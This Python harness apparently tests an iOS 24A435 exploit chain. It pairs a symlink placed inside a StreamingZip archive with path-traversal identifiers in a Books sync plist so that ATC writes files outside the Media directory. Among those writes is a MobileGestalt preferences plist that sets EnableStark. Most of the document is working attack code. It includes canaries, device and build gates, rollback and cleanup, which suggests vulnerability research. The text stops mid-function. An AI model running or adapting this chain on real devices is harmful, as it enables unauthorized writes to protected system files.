#!/usr/bin/env python3
"""ATC + StreamingZip relocated-symlink chain harness for iOS 24A435."""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import importlib.util
import io
import json
import logging
import os
import plistlib
import secrets
import stat
import subprocess
import sys
import tempfile
import zipfile
from contextlib import asynccontextmanager, suppress
from pathlib import Path
from typing import Any

from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.pair_records import get_usbmux_pairing_record


EXPECTED_PRODUCT = "iPhone18,2"
EXPECTED_VERSION = "27.0"
EXPECTED_BUILD = "24A435"
SERVICE = "com.apple.streaming_zip_conduit"
CANARY_NAME = "canary-24A435.txt"
CANARY_BYTES = b"codex-atc-streamingzip-chain-canary-24A435\n"
MG_PLIST_LEAF = "com.apple.MobileGestalt.plist"


def mobilegestalt_plist_bytes(enable_stark: bool) -> bytes:
    return plistlib.dumps(
        {"EnableStark": enable_stark}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )


MG_PLIST_BYTES = mobilegestalt_plist_bytes(True)
MG_PROBE_BUNDLE = "local.research.MobileGestaltStarkBaselineProbe"
ROOT = Path(__file__).resolve().parent
ATC_HOST = ROOT / "atc_host"
MOBILEDEVICE_IO = ROOT / "mobiledevice_io"
TRANSPORT_MODULE = ROOT.parent / "streaming-zip-mg-write-canary" / "canary.py"

TRACKED_BOOKS_FILES = (
    "Books/Books.plist",
    "Books/Sync/Books.plist",
    "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
)
TRACKED_BOOKS_DIRS = (
    "Books/Sync/Database",
    "Books/Sync",
)


def load_transport_module():
    spec = importlib.util.spec_from_file_location("sz_transport_24a435", TRANSPORT_MODULE)
    if spec is None or spec.loader is None:
        raise RuntimeError("unable to load the existing gated Wi-Fi transport")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


TRANSPORT = load_transport_module()


@asynccontextmanager
async def paired_wifi_provider(result: dict[str, Any]):
    """Use Apple's usbmux network endpoint with the existing pair record only."""
    udid = TRANSPORT.paired_coredevice_udid()
    pair_record = await get_usbmux_pairing_record(udid)
    if pair_record is None:
        raise RuntimeError("Apple usbmux omitted the existing pair record")
    provider = None
    attempts = 0
    for retry_index in range(3):
        try:
            provider, attempts = await TRANSPORT.paired_mobdev2_lockdown()
            break
        except Exception:
            if retry_index != 2:
                await asyncio.sleep(1.5)
    if provider is not None:
        transport = {
            "path": "paired mobdev2 TCP lockdown",
            "existingPairing": True,
            "autopair": False,
            "addressesTried": attempts,
        }
    else:
        provider = await create_using_usbmux(
            identifier=udid,
            autopair=False,
            connection_type="Network",
            pair_record=pair_record,
        )
        transport = {
            "path": "Apple usbmux Network lockdown",
            "existingPairing": True,
            "autopair": False,
        }
    try:
        result["transport"] = transport
        yield provider
    finally:
        await provider.close()


def sz_mode_extra(mode: int) -> bytes:
    return TRANSPORT.sz_mode_extra(mode)


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 13, 15, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = sz_mode_extra(mode)
    return info


def build_archive(target_leaf: str) -> bytes:
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        archive.writestr(zip_info("link", stat.S_IFLNK | 0o777), target_leaf.encode())
        archive.writestr(zip_info(f"{target_leaf}/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), CANARY_BYTES)
    return output.getvalue()


def build_preferences_archive(payload_bytes: bytes = CANARY_BYTES) -> bytes:
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        archive.writestr(zip_info("pivot/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("pivot/link", stat.S_IFLNK | 0o777),
            b"../Library/Preferences",
        )
        archive.writestr(zip_info("Library/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("Library/Preferences/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload_bytes)
    return output.getvalue()


def build_books_plist(
    link_identifier: str,
    payload_identifier: str,
    rollback_identifier: str | None = None,
) -> bytes:
    books = [
        {"Persistent ID": link_identifier, "Item ID": "1", "DSID": "1"},
        {"Persistent ID": payload_identifier, "Item ID": "2", "DSID": "1"},
    ]
    if rollback_identifier is not None:
        books.append(
            {"Persistent ID": rollback_identifier, "Item ID": "3", "DSID": "1"}
        )
    value = {"Books": books}
    return plistlib.dumps(value, fmt=plistlib.FMT_BINARY, sort_keys=True)


async def file_snapshot(afc: AfcService, path: str) -> dict[str, Any]:
    if not await afc.exists(path):
        return {"exists": False}
    if await afc.isdir(path):
        raise RuntimeError(f"tracked file unexpectedly became a directory: {path}")
    data = await afc.get_file_contents(path)
    return {
        "exists": True,
        "data": data,
        "size": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
    }


async def take_books_snapshot(afc: AfcService) -> dict[str, Any]:
    files = {path: await file_snapshot(afc, path) for path in TRACKED_BOOKS_FILES}
    dirs = {path: await afc.isdir(path) for path in TRACKED_BOOKS_DIRS}
    return {"files": files, "dirs": dirs}


def public_snapshot(snapshot: dict[str, Any]) -> dict[str, Any]:
    return {
        "files": {
            path: {key: value for key, value in row.items() if key != "data"}
            for path, row in snapshot["files"].items()
        },
        "dirs": snapshot["dirs"],
    }


async def restore_books_snapshot(afc: AfcService, snapshot: dict[str, Any]) -> list[str]:
    failures: list[str] = []
    for path, row in snapshot["files"].items():
        try:
            if row["exists"]:
                parent = path.rsplit("/", 1)[0]
                await afc.makedirs(parent)
                await afc.set_file_contents(path, row["data"])
            elif await afc.exists(path):
                if not await afc.rm_single(path, force=True):
                    failures.append(f"remove:{path}")
        except Exception as error:
            failures.append(f"restore:{path}:{type(error).__name__}")

    for path in TRACKED_BOOKS_DIRS:
        if not snapshot["dirs"][path] and await afc.exists(path):
            with suppress(Exception):
                entries = await afc.listdir(path)
                if not entries and not await afc.rm_single(path, force=True):
                    failures.append(f"remove-dir:{path}")

    for path, row in snapshot["files"].items():
        try:
            current = await file_snapshot(afc, path)
            if current["exists"] != row["exists"]:
                failures.append(f"existence-mismatch:{path}")
            elif row["exists"] and current["sha256"] != row["sha256"]:
                failures.append(f"hash-mismatch:{path}")
        except Exception as error:
            failures.append(f"verify:{path}:{type(error).__name__}")
    return failures


async def remove_generated(afc: AfcService, source: str, link_dest: str, target: str) -> list[str]:
    ordered = [
        link_dest,
        f"{target}/{CANARY_NAME}",
        target,
        f"{source}/link",
        f"{source}/payload",
        f"{source}/META-INF/com.apple.ZipMetadata.plist",
        f"{source}/META-INF",
        f"{source}/{target}",
        source,
    ]
    failures: list[str] = []
    for path in ordered:
        try:
            if await afc.exists(path) and not await afc.rm_single(path, force=True):
                failures.append(path)
        except Exception:
            failures.append(path)
    return failures


async def remove_preferences_generated(
    afc: AfcService,
    source: str,
    link_dest: str,
    recovered: str,
) -> list[str]:
    ordered = [
        link_dest,
        recovered,
        f"{source}/pivot/link",
        f"{source}/payload",
        f"{source}/META-INF/com.apple.ZipMetadata.plist",
        f"{source}/META-INF",
        f"{source}/Library/Preferences",
        f"{source}/Library",
        f"{source}/pivot",
        source,
    ]
    failures: list[str] = []
    for path in ordered:
        try:
            if await afc.exists(path) and not await afc.rm_single(path, force=True):
                failures.append(path)
        except Exception:
            failures.append(path)
    return failures


async def start_streaming_zip(provider, source: str, archive: bytes) -> Any:
    connection = None
    for service_name in (SERVICE, f"{SERVICE}.shim.remote"):
        try:
            connection = await provider.start_lockdown_service(service_name)
            break
        except Exception:
            continue
    if connection is None:
        raise RuntimeError("streaming zip conduit could not be started")
    try:
        await connection.send_plist({"MediaSubdir": source})
        await connection.sendall(archive)
        return await asyncio.wait_for(connection.recv_plist(), timeout=30)
    finally:
        await connection.close()


def run_atc_host(
    udid: str,
    link_identifier: str,
    link_dest: str,
    payload_identifier: str,
    payload_dest: str,
    rollback_identifier: str | None = None,
    rollback_dest: str | None = None,
    gate_path: str | None = None,
) -> dict[str, Any]:
    command = [
        os.fspath(ATC_HOST),
        udid,
        link_identifier,
        link_dest,
        payload_identifier,
        payload_dest,
    ]
    if rollback_identifier is not None and rollback_dest is not None:
        command.extend([rollback_identifier, rollback_dest])
    if gate_path is not None:
        command.append(gate_path)
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=150 if gate_path is not None else 90,
        text=True,
    )
    lines = [line for line in completed.stdout.splitlines() if line.strip()]
    parsed = None
    for line in reversed(lines):
        try:
            parsed = json.loads(line)
            break
        except json.JSONDecodeError:
            continue
    if parsed is None and lines:
        parsed = {
            "ok": False,
            "error": "unparseable helper output",
            "stdoutTail": [TRANSPORT.redact(line) for line in lines[-6:]],
        }
    elif parsed is None:
        parsed = {"ok": False, "error": "no helper output"}
    parsed["exitCode"] = completed.returncode
    if completed.stderr:
        parsed["stderrTail"] = [
            TRANSPORT.redact(line) for line in completed.stderr.splitlines()[-6:]
        ]
    return parsed


def run_source_probe(device_identifier: str) -> dict[str, Any]:
    completed = subprocess.run(
        [
            "xcrun",
            "devicectl",
            "device",
            "process",
            "launch",
            "--device",
            device_identifier,
            "--terminate-existing",
            "--console",
            "--timeout",
            "20",
            MG_PROBE_BUNDLE,
        ],
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=35,
        text=True,
    )
    marker = "MG_STARK_BASELINE_RESULT "
    report = None
    for line in completed.stdout.splitlines():
        if marker not in line:
            continue
        try:
            report = json.loads(line.split(marker, 1)[1])
        except json.JSONDecodeError:
            continue
    result: dict[str, Any] = {
        "exitCode": completed.returncode,
        "report": report,
    }
    if report is None:
        result["error"] = "fresh-process probe result marker not observed"
        result["stdoutTail"] = [
            TRANSPORT.redact(line) for line in completed.stdout.splitlines()[-8:]
        ]
        result["stderrTail"] = [
            TRANSPORT.redact(line) for line in completed.stderr.splitlines()[-8:]
        ]
    return result


def run_mobiledevice_io(command: str, *arguments: str) -> dict[str, Any]:
    completed = subprocess.run(
        [os.fspath(MOBILEDEVICE_IO), command, *arguments],
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=55,
        text=True,
    )
    parsed = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            parsed = json.loads(line)
            break
        except json.JSONDecodeError:
            continue
    if parsed is None:
        parsed = {
            "operation": {"ok": False},
            "error": "MobileDevice helper result was not parseable",
            "stdoutTail": [
                TRANSPORT.redact(line) for line in completed.stdout.splitlines()[-8:]
            ],
        }
    parsed["exitCode"] = completed.returncode
    if completed.stderr:
        parsed["stderrTail"] = [
            TRANSPORT.redact(line) for line in completed.stderr.splitlines()[-8:]
        ]
    return parsed


def mg_source_path_row(report: dict[str, Any] | None) -> dict[str, Any]:
    if not isinstance(report, dict):
        return {}
    for row in report.get("underlyingPathReadability", []):
        if row.get("path") == (
            "/var/mobile/Library/Preferences/com.apple.MobileGestalt.plist"
        ):
            return row
    return {}


def mg_source_absent(probe: dict[str, Any]) -> bool:
    report = probe.get("report")
    row = mg_source_path_row(report)
    observation = report.get("sourcePreferenceObservation", {}) if report else {}
    brokered = observation.get("cfPreferencesEnableStark", {})
    return bool(
        probe.get("exitCode") == 0
        and row.get("lstat", {}).get("result") == -1
        and row.get("lstat", {}).get("errno") == 2
        and row.get("stat", {}).get("result") == -1
        and row.get("stat", {}).get("errno") == 2
        and "readSucceeded" in observation
        and not bool(observation.get("readSucceeded"))
        and brokered.get("type") == "nil"
    )


def mg_source_observed_protected_presence(probe: dict[str, Any]) -> bool:
    """Recognize the sandbox-visible transition from absent to protected.

    A freshly launched ordinary app cannot read this preferences object once it
    exists.  On 24A435, the exact path changes from ENOENT/Cocoa 260 while
    absent to EPERM/Cocoa 257 while present.  This is only presence evidence;
    byte identity is established independently by the post-move host recovery.
    """
    report = probe.get("report")
    row = mg_source_path_row(report)
    observation = report.get("sourcePreferenceObservation", {}) if report else {}
    brokered = observation.get("cfPreferencesEnableStark", {})
    return bool(
        probe.get("exitCode") == 0
        and row.get("lstat", {}).get("result") == -1
        and row.get("lstat", {}).get("errno") == 1
        and row.get("stat", {}).get("result") == -1
        and row.get("stat", {}).get("errno") == 1
        and row.get("accessReadOnly", {}).get("result") == -1
        and row.get("accessReadOnly", {}).get("errno") == 1
        and not bool(observation.get("readSucceeded"))
        and observation.get("readErrorCode") == 257
        and brokered.get("type") == "nil"
    )


def mg_source_observed_true(probe: dict[str, Any]) -> bool:
    report = probe.get("report")
    row = mg_source_path_row(report)
    observation = report.get("sourcePreferenceObservation", {}) if report else {}
    enable_stark = observation.get("enableStark", {})
    brokered = observation.get("cfPreferencesEnableStark", {})
    direct_observation = bool(
        probe.get("exitCode") == 0
        and row.get("lstat", {}).get("result") == 0
        and bool(row.get("lstat", {}).get("isRegularFile"))
        and row.get("stat", {}).get("result") == 0
        and bool(observation.get("readSucceeded"))
        and bool(observation.get("propertyListParsed"))
        and bool(observation.get("rootIsDictionary"))
        and observation.get("rootCount") == 1
        and enable_stark.get("type") == "boolean"
        and enable_stark.get("value") is True
    )
    brokered_observation = bool(
        probe.get("exitCode") == 0
        and brokered.get("type") == "boolean"
        and brokered.get("value") is True
    )
    return direct_observation or brokered_observation


async def preflight() -> tuple[int, dict[str, Any]]:
    result: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipChainPreflight",
        "scope": "/var/mobile/Media read-only",
        "mobileGestaltTouched": False,
    }
    async with paired_wifi_provider(result) as provider:
        if (
            provider.product_type != EXPECTED_PRODUCT
            or provider.product_version != EXPECTED_VERSION
            or provider.product_build_version != EXPECTED_BUILD
        ):
            raise RuntimeError("device/build safety gate rejected the connected target")
        async with AfcService(provider) as afc:
            snapshot = await take_books_snapshot(afc)
            result["device"] = {
                "productType": provider.product_type,
                "productVersion": provider.product_version,
                "build": provider.product_build_version,
                "transport": "paired localNetwork",
            }
            result["booksState"] = public_snapshot(snapshot)
            result["fixedSyncInputAbsent"] = not snapshot["files"]["Books/Sync/Books.plist"]["exists"]
    result["outcome"] = "preflight-complete"
    return 0, result


async def run_canary() -> tuple[int, dict[str, Any]]:
    token = secrets.token_hex(6)
    source = f"codex-atc-src-{EXPECTED_BUILD}-{token}"
    link_dest = f"codex-atc-link-{EXPECTED_BUILD}-{token}"
    target = f"codex-atc-target-{EXPECTED_BUILD}-{token}"
    link_identifier = f"../../{source}/link"
    payload_identifier = f"../../{source}/payload"
    payload_dest = f"{link_dest}/{CANARY_NAME}"
    archive = build_archive(target)
    books_plist = build_books_plist(link_identifier, payload_identifier)
    result: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipRelocatedSymlinkTwoAssetChain",
        "scope": "/var/mobile/Media only",
        "mobileGestaltTouched": False,
        "source": source,
        "linkDestination": link_dest,
        "target": target,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksInputSHA256": hashlib.sha256(books_plist).hexdigest(),
        "canarySHA256": hashlib.sha256(CANARY_BYTES).hexdigest(),
    }
    snapshot: dict[str, Any] | None = None
    cleanup_failures: list[str] = []
    cleanup_armed = False
    try:
        async with paired_wifi_provider(result) as provider:
            if (
                provider.product_type != EXPECTED_PRODUCT
                or provider.product_version != EXPECTED_VERSION
                or provider.product_build_version != EXPECTED_BUILD
            ):
                raise RuntimeError("device/build safety gate rejected the connected target")
            result["device"] = {
                "productType": provider.product_type,
                "productVersion": provider.product_version,
                "build": provider.product_build_version,
                "transport": "paired localNetwork",
            }
            async with AfcService(provider) as afc:
                snapshot = await take_books_snapshot(afc)
                result["booksPreimage"] = public_snapshot(snapshot)
                fresh = {
                    source: not await afc.exists(source),
                    link_dest: not await afc.exists(link_dest),
                    target: not await afc.exists(target),
                }
                result["freshPathGate"] = fresh
                if not all(fresh.values()):
                    raise RuntimeError("fresh-path safety gate failed")
                if snapshot["files"]["Books/Sync/Books.plist"]["exists"]:
                    raise RuntimeError("fixed Books sync input is already present")

                cleanup_armed = True
                try:
                    await afc.makedirs(target)
                    response = await start_streaming_zip(provider, source, archive)
                    result["streamingZipResponse"] = TRANSPORT.json_safe(response)
                    if not await afc.exists(f"{source}/link") or not await afc.exists(
                        f"{source}/payload"
                    ):
                        raise RuntimeError("StreamingZip did not create both source objects")

                    await afc.makedirs("Books/Sync")
                    await afc.set_file_contents("Books/Sync/Books.plist", books_plist)
                    udid = TRANSPORT.paired_coredevice_udid()
                    atc_result = await asyncio.to_thread(
                        run_atc_host,
                        udid,
                        link_identifier,
                        link_dest,
                        payload_identifier,
                        payload_dest,
                    )
                    result["atc"] = atc_result
                    await asyncio.sleep(2)

                    canary_path = f"{target}/{CANARY_NAME}"
                    result["relocatedLinkPresent"] = await afc.exists(link_dest)
                    result["canaryPresent"] = await afc.exists(canary_path)
                    if result["canaryPresent"]:
                        observed = await afc.get_file_contents(canary_path)
                        result["canaryBytesMatch"] = observed == CANARY_BYTES
                        result["observedCanarySHA256"] = hashlib.sha256(observed).hexdigest()
                    else:
                        result["canaryBytesMatch"] = False
                finally:
                    try:
                        cleanup_failures.extend(
                            await remove_generated(afc, source, link_dest, target)
                        )
                    except Exception as error:
                        cleanup_failures.append(f"generated-cleanup:{type(error).__name__}")
                    await asyncio.sleep(2)
                    try:
                        cleanup_failures.extend(await restore_books_snapshot(afc, snapshot))
                    except Exception as error:
                        cleanup_failures.append(f"books-restore:{type(error).__name__}")
                    result["cleanup"] = {
                        "failures": cleanup_failures,
                        "sourceAbsent": not await afc.exists(source),
                        "linkAbsent": not await afc.exists(link_dest),
                        "targetAbsent": not await afc.exists(target),
                    }
    except Exception as error:
        result["errorType"] = type(error).__name__
        result["error"] = TRANSPORT.redact(error)
        result.setdefault("cleanup", {"failures": cleanup_failures})

    cleanup = result.get("cleanup", {})
    success = bool(
        result.get("atc", {}).get("ok")
        and result.get("canaryPresent")
        and result.get("canaryBytesMatch")
        and cleanup.get("sourceAbsent")
        and cleanup.get("linkAbsent")
        and cleanup.get("targetAbsent")
        and not cleanup.get("failures")
    )
    result["outcome"] = "confirmed" if success else "not-confirmed"
    return (0 if success else 2), result


async def run_preferences_canary() -> tuple[int, dict[str, Any]]:
    token = secrets.token_hex(6)
    source = f"codex-pref-src-{EXPECTED_BUILD}-{token}"
    link_dest = f"codex-pref-link-{EXPECTED_BUILD}-{token}"
    recovered = f"codex-pref-recovered-{EXPECTED_BUILD}-{token}"
    preference_leaf = f"com.codex.atc-chain.{EXPECTED_BUILD}.{token}.plist"
    link_identifier = f"../../{source}/pivot/link"
    payload_identifier = f"../../{source}/payload"
    rollback_identifier = f"../../../Library/Preferences/{preference_leaf}"
    payload_dest = f"{link_dest}/{preference_leaf}"
    archive = build_preferences_archive()
    books_plist = build_books_plist(
        link_identifier,
        payload_identifier,
        rollback_identifier,
    )
    result: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipPreferencesWriteAndRollback",
        "scope": "fresh unique /var/mobile/Library/Preferences canary",
        "mobileGestaltTouched": False,
        "source": source,
        "linkDestination": link_dest,
        "recovered": recovered,
        "preferenceLeaf": preference_leaf,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksInputSHA256": hashlib.sha256(books_plist).hexdigest(),
        "canarySHA256": hashlib.sha256(CANARY_BYTES).hexdigest(),
    }
    cleanup_failures: list[str] = []
    try:
        async with paired_wifi_provider(result) as provider:
            if (
                provider.product_type != EXPECTED_PRODUCT
                or provider.product_version != EXPECTED_VERSION
                or provider.product_build_version != EXPECTED_BUILD
            ):
                raise RuntimeError("device/build safety gate rejected the connected target")
            result["device"] = {
                "productType": provider.product_type,
                "productVersion": provider.product_version,
                "build": provider.product_build_version,
                "transport": "paired localNetwork",
            }
            async with AfcService(provider) as afc:
                snapshot = await take_books_snapshot(afc)
                result["booksPreimage"] = public_snapshot(snapshot)
                fresh = {
                    source: not await afc.exists(source),
                    link_dest: not await afc.exists(link_dest),
                    recovered: not await afc.exists(recovered),
                }
                result["freshMediaPathGate"] = fresh
                if not all(fresh.values()):
                    raise RuntimeError("fresh Media-path safety gate failed")
                if snapshot["files"]["Books/Sync/Books.plist"]["exists"]:
                    raise RuntimeError("fixed Books sync input is already present")

                try:
                    response = await start_streaming_zip(provider, source, archive)
                    result["streamingZipResponse"] = TRANSPORT.json_safe(response)
                    if not await afc.exists(f"{source}/pivot/link") or not await afc.exists(
                        f"{source}/payload"
                    ):
                        raise RuntimeError("StreamingZip did not create both source objects")
                    await afc.set_file_contents("Books/Sync/Books.plist", books_plist)
                    udid = TRANSPORT.paired_coredevice_udid()
                    result["atc"] = await asyncio.to_thread(
                        run_atc_host,
                        udid,
                        link_identifier,
                        link_dest,
                        payload_identifier,
                        payload_dest,
                        rollback_identifier,
                        recovered,
                    )
                    await asyncio.sleep(3)
                    result["relocatedLinkPresent"] = await afc.exists(link_dest)
                    result["recoveredPresent"] = await afc.exists(recovered)
                    if result["recoveredPresent"]:
                        observed = await afc.get_file_contents(recovered)
                        result["recoveredBytesMatch"] = observed == CANARY_BYTES
                        result["recoveredSHA256"] = hashlib.sha256(observed).hexdigest()
                    else:
                        result["recoveredBytesMatch"] = False
                finally:
                    try:
                        cleanup_failures.extend(
                            await remove_preferences_generated(
                                afc,
                                source,
                                link_dest,
                                recovered,
                            )
                        )
                    except Exception as error:
                        cleanup_failures.append(f"generated-cleanup:{type(error).__name__}")
                    await asyncio.sleep(2)
                    try:
                        cleanup_failures.extend(await restore_books_snapshot(afc, snapshot))
                    except Exception as error:
                        cleanup_failures.append(f"books-restore:{type(error).__name__}")
                    result["cleanup"] = {
                        "failures": cleanup_failures,
                        "sourceAbsent": not await afc.exists(source),
                        "linkAbsent": not await afc.exists(link_dest),
                        "recoveredAbsent": not await afc.exists(recovered),
                    }
    except Exception as error:
        result["errorType"] = type(error).__name__
        result["error"] = TRANSPORT.redact(error)
        result.setdefault("cleanup", {"failures": cleanup_failures})

    cleanup = result.get("cleanup", {})
    success = bool(
        result.get("atc", {}).get("ok")
        and result.get("recoveredPresent")
        and result.get("recoveredBytesMatch")
        and cleanup.get("sourceAbsent")
        and cleanup.get("linkAbsent")
        and cleanup.get("recoveredAbsent")
        and not cleanup.get("failures")
    )
    result["outcome"] = "confirmed" if success else "not-confirmed"
    return (0 if success else 2), result


async def run_mobilegestalt_source() -> tuple[int, dict[str, Any]]:
    token = secrets.token_hex(6)
    source = f"codex-mg-src-{EXPECTED_BUILD}-{token}"
    link_dest = f"codex-mg-link-{EXPECTED_BUILD}-{token}"
    recovered = f"codex-mg-recovered-{EXPECTED_BUILD}-{token}"
    link_identifier = f"../../{source}/pivot/link"
    payload_identifier = f"../../{source}/payload"
    rollback_identifier = f"../../../Library/Preferences/{MG_PLIST_LEAF}"
    payload_dest = f"{link_dest}/{MG_PLIST_LEAF}"
    archive = build_preferences_archive(MG_PLIST_BYTES)
    books_plist = build_books_plist(
        link_identifier,
        payload_identifier,
        rollback_identifier,
    )
    result: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipMobileGestaltSourceWriteFreshObservationRollback",
        "scope": "/var/mobile/Library/Preferences/com.apple.MobileGestalt.plist",
        "mobileGestaltTouched": False,
        "canonicalCacheTouched": False,
        "source": source,
        "linkDestination": link_dest,
        "recovered": recovered,
        "preferenceLeaf": MG_PLIST_LEAF,
        "chosenKey": "EnableStark",
        "chosenBooleanValue": True,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksInputSHA256": hashlib.sha256(books_plist).hexdigest(),
        "chosenPlistSHA256": hashlib.sha256(MG_PLIST_BYTES).hexdigest(),
        "chosenPlistLength": len(MG_PLIST_BYTES),
    }
    cleanup_failures: list[str] = []
    snapshot: dict[str, Any] | None = None
    try:
        udid = TRANSPORT.paired_coredevice_udid()
        pre_probe = await asyncio.to_thread(run_source_probe, udid)
        result["freshProcessPreimage"] = pre_probe
        result["sourcePreimageAbsent"] = mg_source_absent(pre_probe)
        if not result["sourcePreimageAbsent"]:
            raise RuntimeError("MobileGestalt source preimage is not proven absent")

        async with paired_wifi_provider(result) as provider:
            if (
                provider.product_type != EXPECTED_PRODUCT
                or provider.product_version != EXPECTED_VERSION
                or provider.product_build_version != EXPECTED_BUILD
            ):
                raise RuntimeError("device/build safety gate rejected the connected target")
            result["device"] = {
                "productType": provider.product_type,
                "productVersion": provider.product_version,
                "build": provider.product_build_version,
                "transport": "paired localNetwork",
            }

            async with AfcService(provider) as afc:
                snapshot = await take_books_snapshot(afc)
                result["booksPreimage"] = public_snapshot(snapshot)
                fresh = {
                    source: not await afc.exists(source),
                    link_dest: not await afc.exists(link_dest),
                    recovered: not await afc.exists(recovered),
                }
                result["freshMediaPathGate"] = fresh
                if not all(fresh.values()):
                    raise RuntimeError("fresh Media-path safety gate failed")
                if snapshot["files"]["Books/Sync/Books.plist"]["exists"]:
                    raise RuntimeError("fixed Books sync input is already present")

                try:
                    response = await start_streaming_zip(provider, source, archive)
                    result["streamingZipResponse"] = TRANSPORT.json_safe(response)
                    if not await afc.exists(f"{source}/pivot/link") or not await afc.exists(
                        f"{source}/payload"
                    ):
                        raise RuntimeError("StreamingZip did not create both source objects")
                    await afc.set_file_contents("Books/Sync/Books.plist", books_plist)

                    with tempfile.TemporaryDirectory(prefix="atc-mg-gate-") as gate_dir:
                        gate_path = Path(gate_dir) / "continue"
                        ready_path = Path(f"{gate_path}.ready")
                        result["mobileGestaltTouched"] = True
                        atc_task = asyncio.create_task(
                            asyncio.to_thread(
                                run_atc_host,
                                udid,
                                link_identifier,
                                link_dest,
                                payload_identifier,
                                payload_dest,
                                rollback_identifier,
                                recovered,
                                os.fspath(gate_path),
                            )
                        )
                        try:
                            for _ in range(750):
                                if ready_path.exists() or atc_task.done():
                                    break
                                await asyncio.sleep(0.1)
                            result["payloadCompletionGateReady"] = ready_path.exists()
                            if result["payloadCompletionGateReady"]:
                                observation = await asyncio.to_thread(
                                    run_source_probe, udid
                                )
                                result["freshProcessWhilePresent"] = observation
                                result["freshProcessObservedProtectedPresence"] = (
                                    mg_source_observed_protected_presence(observation)
                                )
                                result["chosenValueObserved"] = (
                                    mg_source_observed_true(observation)
                                )
                            else:
                                result["freshProcessObservedProtectedPresence"] = False
                                result["chosenValueObserved"] = False
                        finally:
                            gate_path.touch(exist_ok=True)
                            result["atc"] = await atc_task

                    await asyncio.sleep(2)
                    result["relocatedLinkPresent"] = await afc.exists(link_dest)
                    result["recoveredPresent"] = await afc.exists(recovered)
                    if result["recoveredPresent"]:
                        observed = await afc.get_file_contents(recovered)
                        result["recoveredBytesMatch"] = observed == MG_PLIST_BYTES
                        result["recoveredSHA256"] = hashlib.sha256(observed).hexdigest()
                    else:
                        result["recoveredBytesMatch"] = False

                    post_probe = await asyncio.to_thread(run_source_probe, udid)
                    result["freshProcessAfterRollback"] = post_probe
                    result["sourceRestoredAbsent"] = mg_source_absent(post_probe)
                finally:
                    try:
                        cleanup_failures.extend(
                            await remove_preferences_generated(
                                afc,
                                source,
                                link_dest,
                                recovered,
                            )
                        )
                    except Exception as error:
                        cleanup_failures.append(
                            f"generated-cleanup:{type(error).__name__}"
                        )
                    await asyncio.sleep(2)
                    if snapshot is not None:
                        try:
                            cleanup_failures.extend(
                                await restore_books_snapshot(afc, snapshot)
                            )
                        except Exception as error:
                            cleanup_failures.append(
                                f"books-restore:{type(error).__name__}"
                            )
                    result["cleanup"] = {
                        "failures": cleanup_failures,
                        "sourceMediaAbsent": not await afc.exists(source),
                        "linkAbsent": not await afc.exists(link_dest),
                        "recoveredAbsent": not await afc.exists(recovered),
                    }
    except Exception as error:
        result["errorType"] = type(error).__name__
        result["error"] = TRANSPORT.redact(error)
        result.setdefault("cleanup", {"failures": cleanup_failures})

    cleanup = result.get("cleanup", {})
    atc = result.get("atc", {})
    result["freshHostRecoveredChosenBytes"] = bool(
        result.get("recoveredPresent")
        and result.get("recoveredBytesMatch")
    )
    result["chosenWriteProven"] = bool(
        result.get("sourcePreimageAbsent")
        and result.get("freshProcessObservedProtectedPresence")
        and result.get("freshHostRecoveredChosenBytes")
    )
    success = bool(
        result.get("sourcePreimageAbsent")
        and result.get("payloadCompletionGateReady")
        and result.get("chosenWriteProven")
        and atc.get("ok")
        and atc.get("gatedRollback")
        and not atc.get("gateTimedOut")
        and result.get("recoveredPresent")
        and result.get("recoveredBytesMatch")
        and result.get("sourceRestoredAbsent")
        and cleanup.get("sourceMediaAbsent")
        and cleanup.get("linkAbsent")
        and cleanup.get("recoveredAbsent")
        and not cleanup.get("failures")
    )
    result["exactRollback"] = bool(
        result.get("sourcePreimageAbsent")
        and result.get("recoveredBytesMatch")
        and result.get("sourceRestoredAbsent")
    )
    result["outcome"] = "confirmed" if success else "not-confirmed"
    return (0 if success else 2), result


async def run_mobilegestalt_source_native(
    chosen_value: bool = True,
